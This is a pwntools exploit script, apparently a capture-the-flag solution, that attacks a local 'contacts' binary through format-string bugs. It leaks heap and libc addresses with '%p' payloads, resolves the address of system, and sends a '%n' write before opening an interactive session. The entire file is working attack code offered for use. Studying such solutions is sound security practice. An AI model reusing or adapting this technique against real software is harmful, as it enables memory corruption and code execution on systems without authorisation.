from pwn import *
context.log_level='info'

p = process('contacts')
bin = ELF('contacts')
libc = bin.libc
gdb.attach(p,"b *0x08048C22\nc\n")
p.sendlineafter('>>>',"1")
p.sendlineafter('Name:',"aaaaaaaaaa")
p.sendlineafter('No:',"bbbbbbbbbb")
p.sendlineafter('Length of description:',"30")
p.sendlineafter('Enter description:',"%1$p%2$p")
p.sendlineafter('>>>',"4")
p.recvuntil("0x")
des_heap = int(p.recv(7),16)+0x10 - 4
print 'heap:',hex(des_heap)
p.recvuntil("0x")
puts = int(p.recv(8),16)-11
print 'libc puts old address :',hex(libc.sym['puts'] )

libc.address = puts - libc.sym['puts']

print 'libc puts address :',hex(libc.sym['puts'] )
print 'libc printf address :',hex(libc.sym['printf'] )
print 'lib address :',hex(libc.address )
print 'lib system address :',hex(libc.sym['system'] )

#p.sendlineafter('>>>',"4")

p.sendlineafter('>>>',"3")
p.sendlineafter('change?',"aaaaaaaaaa")
p.sendlineafter('>>>',"2")
p.sendlineafter('Length of description:',"30")
p.sendlineafter('Description:',"%1d%6$n")
p.sendlineafter('>>>',"4")
#p.sendlineafter('>>>',"4")
p.interactive()
